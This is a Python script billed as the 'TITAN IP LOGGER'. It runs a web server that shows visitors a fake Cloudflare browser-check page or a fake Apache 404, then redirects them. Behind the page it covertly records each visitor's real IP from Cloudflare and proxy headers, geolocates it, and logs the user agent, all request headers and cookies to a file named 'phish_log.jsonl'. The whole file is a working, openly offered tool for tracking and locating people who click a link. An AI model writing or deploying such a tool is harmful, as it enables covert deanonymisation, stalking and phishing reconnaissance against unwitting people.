#!/usr/bin/env python3
"""
TITAN IP LOGGER - Cloudflare Optimized
A professional IP logging and reconnaissance tool.
Features:
- Cloudflare header support (CF-Connecting-IP, True-Client-IP)
- Geolocation lookup (ip-api.com)
- JSONL persistent logging
- Stealthy landing pages
- Request fingerprinting (User-Agent, Headers, Cookies)
"""

import os
import json
import time
import socket
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from urllib.parse import urlparse

# Configuration
PORT = 8080
LOG_FILE = "/data/data/com.termux/files/home/phish_log.jsonl"
GEO_API = "http://ip-api.com/json/"

# Stealth Templates
TEMPLATES = {
    "404": {
        "title": "404 Not Found",
        "content": "<h1>404 Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache/2.4.41 (Ubuntu) Server at localhost Port 80</address>",
        "status": 404
    },
    "loading": {
        "title": "Checking your browser...",
        "content": """
            <div style="font-family: sans-serif; text-align: center; margin-top: 20%;">
                <h2>Checking your browser before accessing the resource.</h2>
                <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
                <div class="spinner"></div>
            </div>
            <style>
                .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
            <script>setTimeout(() => { window.location.href = "https://google.com"; }, 3000);</script>
        """,
        "status": 200
    }
}

ACTIVE_TEMPLATE = "loading"

class TitanLoggerHandler(BaseHTTPRequestHandler):
    def get_geo_info(self, ip):
        """Fetch geolocation data for the IP."""
        try:
            with urllib.request.urlopen(f"{GEO_API}{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query", timeout=5) as response:
                data = json.loads(response.read().decode())
                if data.get("status") == "success":
                    return data
        except Exception as e:
            return {"error": str(e)}
        return {}

    def log_request_data(self):
        """Extract and log detailed request information."""
        headers = self.headers
        client_ip = self.client_address[0]
        
        # Cloudflare / Proxy Headers
        cf_connecting = headers.get('CF-Connecting-IP')
        true_client = headers.get('True-Client-IP')
        x_forwarded = headers.get('X-Forwarded-For')
        x_real_ip = headers.get('X-Real-IP')
        
        # Determine the most likely 'real' IP
        # Priority: CF-Connecting-IP > True-Client-IP > X-Forwarded-For (first) > Direct IP
        real_ip = cf_connecting or true_client
        if not real_ip and x_forwarded:
            real_ip = x_forwarded.split(',')[0].strip()
        if not real_ip:
            real_ip = client_ip

        # Geo Lookup
        geo_data = self.get_geo_info(real_ip)

        # Log entry structure
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "target_ip": real_ip,
            "direct_ip": client_ip,
            "path": self.path,
            "method": self.command,
            "user_agent": headers.get('User-Agent', 'Unknown'),
            "headers": dict(headers),
            "geo": geo_data
        }

        # Print to terminal
        print("\n" + "█" * 60)
        print(f"[*] NEW LOG ENTRY: {real_ip}")
        print(f"[*] Location: {geo_data.get('city', 'Unknown')}, {geo_data.get('country', 'Unknown')}")
        print(f"[*] ISP: {geo_data.get('isp', 'Unknown')}")
        print(f"[*] User-Agent: {log_entry['user_agent']}")
        print("█" * 60 + "\n")

        # Save to JSONL
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(log_entry) + "\n")

    def do_GET(self):
        self.log_request_data()
        
        template = TEMPLATES.get(ACTIVE_TEMPLATE, TEMPLATES["404"])
        
        self.send_response(template["status"])
        self.send_header("Content-type", "text/html")
        # Anti-caching headers
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
        self.send_header("Pragma", "no-cache")
        self.end_headers()
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>{template['title']}</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
        </head>
        <body>
            {template['content']}
        </body>
        </html>
        """
        self.wfile.write(html.encode())

    def log_message(self, format, *args):
        # Override to suppress default logging to stdout
        pass

def main():
    print("="*60)
    print("  TITAN IP LOGGER v1.0 - Cloudflare Optimized")
    print("="*60)
    print(f"[*] Port: {PORT}")
    print(f"[*] Log File: {LOG_FILE}")
    print(f"[*] Stealth Template: {ACTIVE_TEMPLATE}")
    
    try:
        server = HTTPServer(("0.0.0.0", PORT), TitanLoggerHandler)
        print(f"[*] Server started at http://localhost:{PORT}")
        print("[!] Waiting for incoming connections...")
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        server.shutdown()
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
